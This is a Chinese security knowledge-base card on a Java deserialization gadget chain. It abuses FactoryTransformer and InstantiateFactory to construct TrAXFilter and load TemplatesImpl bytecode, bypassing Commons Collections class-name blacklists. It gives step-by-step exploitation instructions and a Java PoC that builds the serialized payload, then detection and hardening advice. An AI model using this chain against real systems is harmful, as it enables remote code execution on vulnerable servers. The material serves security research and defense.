---
id: web-java-deser-cc-factorytransformer-instantiatefactory-traxfilter
title: CC 黑名单绕过：FactoryTransformer.create→InstantiateFactory 实例化 TrAXFilter 加载 TemplatesImpl
type: scenario
domain: web
path: web/java/deserialization
technique: cc-factorytransformer-instantiatefactory-traxfilter
aliases:
- FactoryTransformer
- InstantiateFactory
- TrAXFilter 绕过
- serialkiller 绕过
- CC3 替代出口
- 无 ChainedTransformer 链
- 无 InvokerTransformer 链
tags:
- java
- deserialization
- gadget
- commons-collections
- blacklist-bypass
- factorytransformer
- instantiatefactory
- traxfilter
- templatesimpl
- rce
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-V301
  verified_at: '2026-11-08T12:06:48+08:00'
  notes: 已对照原文与 2 张图核对：图01 为 CC1/CC3/CC4/CC5/CC6 入口汇总（入口不变、需找新出口/sink），图02 为 ReflectionFactory.create 源码（印证不可序列化、只能无参实例化，故跳过）。卡片链与原文一致：serialkiller 黑名单封 Transformer/InvokerTransformer/ChainedTransformer/ConstantTransformer/InstantiateTransformer 及 CC4 对应类，漏 FactoryTransformer/InstantiateFactory；FactoryTransformer.transform→iFactory.create()→InstantiateFactory.create()→iConstructor.newInstance(iArgs)→TrAXFilter(Templates) 构造器→templates.newTransformer()→TemplatesImpl 字节码；PoC（_bytecodes/_name/_tfactory、InstantiateFactory(TrAXFilter.class,{Templates},{templates})、FactoryTransformer、LazyMap+ConstantTransformer(1)、TiedMapEntry、反射换 factory、lazy.remove）与原文逐项一致。affected_versions 原文未给（仅 PoC 依赖 commons-collections 3.2.1），未设。dedup top1 为自身 exact，其余 related（TransformedList/ConstantFactory 黑名单缺口、CC3 InvokerTransformer newTransformer 变体等）均不同出口；dup-scan 与 14309 JNDI 工厂卡 pair 为 related。未验证点：未执行 PoC。
---

## 一句话结论

当 SerialKiller 一类的类名黑名单把 `InvokerTransformer`、`ChainedTransformer`、`ConstantTransformer`、`InstantiateTransformer` 等标准 CC 出口全部封掉、却漏掉 `FactoryTransformer` 与 `InstantiateFactory` 时，可以用 `FactoryTransformer.transform()` 调用可控的 `Factory.create()`，再用 `InstantiateFactory.create()` 反射执行 `TrAXFilter(Templates)` 构造器；`TrAXFilter` 构造器内部调用 `templates.newTransformer()`，从而触发 `TemplatesImpl` 加载恶意字节码，实现与 CC3 等价的 RCE，整条链不含任何被黑名单覆盖的类。

## 原理

- **FactoryTransformer 是新的出口**：`FactoryTransformer` 实现 `Transformer`，其 `transform(Object input)` 完全忽略入参，直接 `return iFactory.create();`；`iFactory` 由构造器注入且可序列化，因此只要找到一个可序列化、`create()` 能造成危害的 `Factory`，就能替代 `InvokerTransformer` 的反射调用。
- **InstantiateFactory 是新的执行原语**：`InstantiateFactory` 实现 `Factory`，`create()` 在 `iConstructor == null` 时调用 `findConstructor()` 取构造器，然后执行 `iConstructor.newInstance(iArgs)`；其公有构造器接收 `(Class classToInstantiate, Class[] paramTypes, Object[] args)`，可序列化并可由攻击者完全控制。
- **TrAXFilter 构造器即 sink**：`TrAXFilter` 的公有构造器 `TrAXFilter(Templates templates)` 内部执行 `templates.newTransformer()`；传入 `TemplatesImpl` 后进入 `getTransletInstance()` → `defineTransletClasses()` → `TransletClassLoader.defineClass()`，加载 `_bytecodes` 中的恶意类。前置条件与 CC3 相同：`_name` 非空、`_class == null`、`_tfactory` 为 `TransformerFactoryImpl`、字节码类继承 `AbstractTranslet`。
- **为什么绕过该黑名单**：示例 serialkiller.conf 用精确 FQCN 正则封禁 `org.apache.commons.collections.functors.InvokerTransformer`、`ChainedTransformer`、`ConstantTransformer`、`InstantiateTransformer` 及 collections4 对应类；`org.apache.commons.collections.functors.FactoryTransformer` 与 `InstantiateFactory` 不在名单内。正则 `org\.apache\.commons\.collections\.Transformer$` 只匹配该接口的全名，不会匹配子类/实现类的全名。
- **入口复用**：HashMap 反序列化时 `putVal(hash(key))` → `TiedMapEntry.hashCode()` → `getValue()` → `LazyMap.get()`（键不存在时）→ `factory.transform(key)`。构造 payload 时先用无害的 `ConstantTransformer(1)` 占位，put 完成后再反射把 `LazyMap.factory` 换成 `FactoryTransformer`，并 `lazyMap.remove(key)` 清除缓存，避免生成端提前触发。

## 触发条件

- classpath 存在 Commons Collections 3.x（原文 PoC 使用 commons-collections 3.2.1），`FactoryTransformer`/`InstantiateFactory`/`LazyMap`/`TiedMapEntry` 可序列化；
- 反序列化入口采用类名黑名单（SerialKiller 或自写 `resolveClass`），且只封了常见 CC functor，未封 `FactoryTransformer`、`InstantiateFactory`；
- 目标 JDK 可访问内部 Xalan `TemplatesImpl`（JDK 8 默认可用），恶意字节码可继承 `AbstractTranslet`；
- 攻击者能提交序列化数据到 `ObjectInputStream.readObject`，并能反射设置 `TemplatesImpl` 与 `LazyMap` 私有字段。

## 利用步骤

1. 编译继承 `com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet` 的恶意类，在构造器或静态块写入命令，取得 `.class` 字节码。
2. 反射构造 `TemplatesImpl`：`_name` 非空、`_class=null`、`_bytecodes=new byte[][]{bytes}`、`_tfactory=new TransformerFactoryImpl()`。
3. 构造 `new InstantiateFactory(TrAXFilter.class, new Class[]{Templates.class}, new Object[]{templates})`，再用 `new FactoryTransformer(instantiateFactory)` 包装。
4. 用 `LazyMap.decorate(new HashMap(), new ConstantTransformer(1))` 建入口，`new TiedMapEntry(lazyMap, "123")` 放入外层 `HashMap`。
5. 反射把 `lazyMap.factory` 替换为真正的 `FactoryTransformer`，`lazyMap.remove("123")` 清缓存。
6. 序列化外层 Map 并发送；反序列化时经 `HashMap.readObject → TiedMapEntry.hashCode → LazyMap.get → FactoryTransformer.transform → InstantiateFactory.create → TrAXFilter → TemplatesImpl` 执行命令。

## PoC

```java
TemplatesImpl t = new TemplatesImpl();
setField(t, "_bytecodes", new byte[][]{code});
setField(t, "_name", "calc");
setField(t, "_tfactory", new TransformerFactoryImpl());

InstantiateFactory factory = new InstantiateFactory(
        TrAXFilter.class, new Class[]{Templates.class}, new Object[]{t});
FactoryTransformer ft = new FactoryTransformer(factory);

Map inner = new HashMap();
LazyMap lazy = (LazyMap) LazyMap.decorate(inner, new ConstantTransformer(1));
TiedMapEntry entry = new TiedMapEntry(lazy, "123");

Map payload = new HashMap();
payload.put(entry, "x");                 // put 阶段 factory 还是无害 ConstantTransformer
setField(lazy, "factory", ft);           // 反射换成真实链
lazy.remove("123");                      // 清除 put 阶段写入的缓存

// serialize(payload) 后发送
```

`setField` 为常见的 `Field.setAccessible(true)` 反射赋值；字节码需继承 `AbstractTranslet`，否则 `defineTransletClasses` 校验失败。

## 变体与关联

- **关联**：`web-java-deser-commonscollections-cc3-invokertransformer-newtransformer-variant` 覆盖 `TrAXFilter + InstantiateTransformer` 路径；本卡把 `InstantiateTransformer` 换成 `FactoryTransformer + InstantiateFactory`，在封禁前者的黑名单下仍可用。
- **变体**：`PrototypeFactory$PrototypeSerializationFactory` 的 `create()` 做序列化/反序列化往返，可作为另一种 `Factory` 载体（原文给出的 PoC 实际未把它接入外层链，故未单独成卡）；`SwitchTransformer` 可替代 `ChainedTransformer` 做多 Transformer 循环，但原文无 PoC。
- **边界**：仅适用于未封 `FactoryTransformer`/`InstantiateFactory` 的黑名单；使用 allowlist 或 JEP 290 全局过滤器时该链无效；高版本 JDK 对 Xalan 内部类的模块封装会阻断 `TemplatesImpl`，需换其他 sink。

## 检测与防御

- **黑名单补全**：SerialKiller/自定义过滤器应覆盖 `FactoryTransformer`、`InstantiateFactory`、`PrototypeFactory$PrototypeSerializationFactory`、`SwitchTransformer`、`DefaultedMap` 等冷门 functor/map，而不要只枚举 ysoserial 常见链。
- **根本方案**：使用类白名单或 JEP 290 `ObjectInputFilter`，把反序列化限制在业务必需类型；升级 Commons Collections 到 3.2.2+（`InvokerTransformer` 等不再可序列化）并移除不用的 functor 依赖。
- **运行时检测**：监控反序列化流中出现 `FactoryTransformer`/`InstantiateFactory`/`TrAXFilter`/`TemplatesImpl` 类名；对 `TemplatesImpl.defineClass`、异常 `FunctorException` 做告警。
- **防御**：禁止不可信数据进入 `ObjectInputStream`；对必须反序列化的入口做签名/加密与类型校验；限制 `TransformerFactoryImpl` 等 Xalan 内部类的使用。
